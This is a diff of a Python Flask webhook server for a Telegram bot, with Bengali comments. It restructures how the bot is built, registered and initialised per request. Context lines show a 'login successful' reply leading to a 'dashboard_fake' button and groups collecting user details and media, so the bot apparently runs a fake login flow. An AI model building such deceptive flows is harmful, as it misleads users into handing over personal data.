@@ -1,6 +1,5 @@
 import os
 import logging
-import urllib.request
 from flask import Flask, request
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -17,12 +16,14 @@ USER_DETAILS_GROUP_ID = int(os.getenv("USER_DETAILS_GROUP_ID", "0"))
 USER_MEDIA_GROUP_ID = int(os.getenv("USER_MEDIA_GROUP_ID", "0"))
 
 app = Flask(__name__)
-telegram_app = None
 
 user_states = {}
 user_temp_data = {}
 
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
+
+# টেলিগ্রাম অ্যাপ্লিকেশন বিল্ড করা
+telegram_app = Application.builder().token(TOKEN).build()
 
 async def clean_and_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
     chat_id = update.effective_chat.id
@@ -201,25 +202,10 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             keyboard = [[InlineKeyboardButton("👉 Open Dashboard", callback_data="dashboard_fake")]]
             await clean_and_send(update, context, "✅ লগইন সফল!", InlineKeyboardMarkup(keyboard))
 
-async def init_bot():
-    global telegram_app
-    telegram_app = Application.builder().token(TOKEN).build()
-    
-    telegram_app.add_handler(CommandHandler("start", start))
-    telegram_app.add_handler(CallbackQueryHandler(button_handler))
-    telegram_app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
-    
-    await telegram_app.initialize()
-
-def set_webhook_automatically():
-    render_url = os.getenv("RENDER_EXTERNAL_URL")
-    if render_url and TOKEN:
-        webhook_url = f"{render_url}/{TOKEN}"
-        telegram_api_url = f"https://api.telegram.org/bot{TOKEN}/setWebhook?url={webhook_url}"
-        try:
-            urllib.request.urlopen(telegram_api_url)
-        except Exception:
-            pass
+# হ্যান্ডলারগুলো যোগ করা
+telegram_app.add_handler(CommandHandler("start", start))
+telegram_app.add_handler(CallbackQueryHandler(button_handler))
+telegram_app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))
 
 @app.route("/")
 def index():
@@ -228,19 +214,19 @@ def index():
 @app.route(f"/{TOKEN}", methods=["POST"])
 def webhook():
     if request.method == "POST":
-        import asyncio
-        async def process():
-            if telegram_app:
-                update = Update.de_json(request.get_json(force=True), telegram_app.bot)
-                await telegram_app.process_update(update)
+        json_data = request.get_json(force=True)
+        update = Update.de_json(json_data, telegram_app.bot)
         
-        asyncio.run(process())
+        # ব্যাকগ্রাউন্ডে আপডেট প্রসেস করার ব্যবস্থা
+        import asyncio
+        async def run_update():
+            await telegram_app.initialize()
+            await telegram_app.process_update(update)
+            
+        asyncio.run(run_update())
         return "OK", 200
     return "Forbidden", 403
 
 if __name__ == "__main__":
-    import asyncio
-    asyncio.run(init_bot())
-    set_webhook_automatically()
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port)
